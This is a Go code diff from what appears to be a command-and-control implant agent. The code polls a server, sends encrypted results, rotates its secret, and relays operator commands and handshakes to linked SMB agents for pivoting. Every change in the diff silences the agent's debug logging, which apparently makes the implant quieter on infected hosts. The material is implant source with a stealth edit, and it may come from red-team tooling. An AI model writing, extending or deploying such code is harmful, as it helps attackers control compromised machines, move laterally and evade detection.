@@ -13,7 +13,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"log"
+	// "log"
 	"math"
 	"math/rand"
 	"net/http"
@@ -350,7 +350,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	// "handshake_response", fail the handshake, and close the pipe.
 	if linkRespVal, ok := responseMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
 		if linkRespData, ok := linkRespVal.([]interface{}); ok {
-			log.Printf("[LinkManager] Processing %d handshake responses before commands", len(linkRespData))
+			// log.Printf("[LinkManager] Processing %d handshake responses before commands", len(linkRespData))
 			processLinkHandshakeResponses(linkRespData)
 		}
 	}
@@ -365,7 +365,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 			// This enables faster round-trip for linked agent commands
 			linkData := GetLinkManager().GetOutboundData()
 			if len(linkData) > 0 {
-				log.Printf("[LinkManager] Sending %d immediate link responses to server", len(linkData))
+				// log.Printf("[LinkManager] Sending %d immediate link responses to server", len(linkData))
 				sendImmediateLinkData(secureComms, customHeaders, linkData)
 			}
 		}
@@ -445,7 +445,7 @@ func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]st
 
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
-		log.Printf("[LinkManager] Failed to marshal immediate link data: %v", err)
+		// log.Printf("[LinkManager] Failed to marshal immediate link data: %v", err)
 		// Re-queue the data so it's not lost
 		requeueLinkData(linkData)
 		return
@@ -453,18 +453,18 @@ func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]st
 
 	encrypted, err := secureComms.EncryptMessage(string(jsonData))
 	if err != nil {
-		log.Printf("[LinkManager] Failed to encrypt immediate link data: %v", err)
+		// log.Printf("[LinkManager] Failed to encrypt immediate link data: %v", err)
 		// Re-queue the data so it's not lost
 		requeueLinkData(linkData)
 		return
 	}
 
 	if err := sendResults(encrypted, customHeaders); err != nil {
-		log.Printf("[LinkManager] Failed to send immediate link data: %v, re-queuing for next poll", err)
+		// log.Printf("[LinkManager] Failed to send immediate link data: %v, re-queuing for next poll", err)
 		// Re-queue the data so it's not lost - will be sent on next poll cycle
 		requeueLinkData(linkData)
 	} else {
-		log.Printf("[LinkManager] Successfully sent %d immediate link responses to server", len(linkData))
+		// log.Printf("[LinkManager] Successfully sent %d immediate link responses to server", len(linkData))
 		secureComms.RotateSecret()
 	}
 }
@@ -475,7 +475,7 @@ func requeueLinkData(linkData []*LinkDataOut) {
 	for _, item := range linkData {
 		lm.queueOutboundData(item)
 	}
-	log.Printf("[LinkManager] Re-queued %d link data items for next poll cycle", len(linkData))
+	// log.Printf("[LinkManager] Re-queued %d link data items for next poll cycle", len(linkData))
 }
 
 // processLinkCommands forwards commands from the server to linked SMB agents
@@ -483,7 +483,7 @@ func requeueLinkData(linkData []*LinkDataOut) {
 func processLinkCommands(linkCmds []interface{}) {
 	lm := GetLinkManager()
 
-	log.Printf("[LinkManager] Processing %d link commands", len(linkCmds))
+	// log.Printf("[LinkManager] Processing %d link commands", len(linkCmds))
 
 	// Timeout for waiting for command responses (5 seconds is reasonable for most commands)
 	const commandResponseTimeout = 5 * time.Second
@@ -503,19 +503,19 @@ func processLinkCommands(linkCmds []interface{}) {
 		}
 
 		// Forward to the linked agent and wait for response
-		log.Printf("[LinkManager] Forwarding command to linked agent %s (with %v timeout)", routingID, commandResponseTimeout)
+		// log.Printf("[LinkManager] Forwarding command to linked agent %s (with %v timeout)", routingID, commandResponseTimeout)
 		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, commandResponseTimeout)
 		if err != nil {
-			log.Printf("[LinkManager] Failed to forward command to %s: %v", routingID, err)
+			// log.Printf("[LinkManager] Failed to forward command to %s: %v", routingID, err)
 			continue
 		}
 
 		if response != nil {
 			// Got an immediate response - queue it for the server
-			log.Printf("[LinkManager] Got immediate response from %s, queuing for server", routingID)
+			// log.Printf("[LinkManager] Got immediate response from %s, queuing for server", routingID)
 			lm.queueOutboundData(response)
 		} else {
-			log.Printf("[LinkManager] No immediate response from %s (will come later)", routingID)
+			// log.Printf("[LinkManager] No immediate response from %s (will come later)", routingID)
 		}
 	}
 }
@@ -546,7 +546,7 @@ func processLinkHandshakeResponses(responses []interface{}) {
 		lm.mu.RUnlock()
 
 		if !exists || link == nil {
-			log.Printf("[LinkManager] No link found for routing_id %s when forwarding handshake response", routingID)
+			// log.Printf("[LinkManager] No link found for routing_id %s when forwarding handshake response", routingID)
 			continue
 		}
 
@@ -564,21 +564,21 @@ func processLinkHandshakeResponses(responses []interface{}) {
 		// Try to send regardless of IsActive - the SMB agent may be waiting with long timeout
 		link.mu.Lock()
 		if link.Conn != nil {
-			log.Printf("[LinkManager] Forwarding handshake response to routing_id %s (IsActive=%v)", routingID, link.IsActive)
+			// log.Printf("[LinkManager] Forwarding handshake response to routing_id %s (IsActive=%v)", routingID, link.IsActive)
 			if err := writeMessage(link.Conn, data); err != nil {
-				log.Printf("[LinkManager] Failed to send handshake response to %s: %v", routingID, err)
+				// log.Printf("[LinkManager] Failed to send handshake response to %s: %v", routingID, err)
 			} else {
-				log.Printf("[LinkManager] Successfully sent handshake response to routing_id %s", routingID)
+				// log.Printf("[LinkManager] Successfully sent handshake response to routing_id %s", routingID)
 				link.LastSeen = time.Now()
 				// Re-activate link if it was marked inactive due to read timeout
 				// The handshake response completing successfully proves the pipe is still alive
 				if !link.IsActive {
 					link.IsActive = true
-					log.Printf("[LinkManager] Re-activated link %s after successful handshake response", routingID)
+					// log.Printf("[LinkManager] Re-activated link %s after successful handshake response", routingID)
 				}
 			}
 		} else {
-			log.Printf("[LinkManager] Link %s has nil connection, cannot send handshake response", routingID)
+			// log.Printf("[LinkManager] Link %s has nil connection, cannot send handshake response", routingID)
 		}
 		link.mu.Unlock()
 	}
@@ -660,10 +660,6 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			hasLinkData := len(linkData) > 0
 			hasUnlinkNotifications := len(unlinkNotifications) > 0
 
-			// Debug logging
-			log.Printf("[Polling] Iteration start: hasResults=%v, hasLinkData=%v, hasUnlinkNotifications=%v, unlinkCount=%d",
-				hasResults, hasLinkData, hasUnlinkNotifications, len(unlinkNotifications))
-
 			if hasResults || hasLinkData || hasUnlinkNotifications {
 				results := resultManager.GetPendingResults()
 
@@ -677,13 +673,13 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 
 				// Include link data if we have any (uses malleable field names)
 				if hasLinkData {
-					log.Printf("[LinkManager] Including %d link data items in POST to server", len(linkData))
+					// log.Printf("[LinkManager] Including %d link data items in POST to server", len(linkData))
 					payload[MALLEABLE_LINK_DATA_FIELD] = linkData
 				}
 
 				// Include unlink notifications if we have any (routing IDs that have been disconnected)
 				if hasUnlinkNotifications {
-					log.Printf("[LinkManager] Including %d unlink notifications in POST to server", len(unlinkNotifications))
+					// log.Printf("[LinkManager] Including %d unlink notifications in POST to server", len(unlinkNotifications))
 					payload["lu"] = unlinkNotifications // "lu" = link_unlink
 				}
 
